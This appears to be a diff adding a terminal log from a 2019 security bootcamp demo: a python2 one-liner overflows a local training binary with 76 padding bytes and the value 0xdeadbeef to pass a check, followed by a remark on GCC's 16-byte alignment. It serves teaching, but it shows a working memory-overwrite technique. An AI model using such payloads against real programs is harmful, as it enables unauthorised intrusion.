@@ -1,0 +1,5 @@
+└[~/bootcamp-2019/pwn/demos/Day1]% python2 -c "print 'A' * 76 + '\xef\xbe\xad\xde'" | ./07_uninitialized_mem        (git)-[master] ?
+Here'es some space for you ;)Check is 0xdeadbeef
+You win!!!
+
+I chose 80 since its evenly divisible by 16 which is the size where GCC aligns memory by
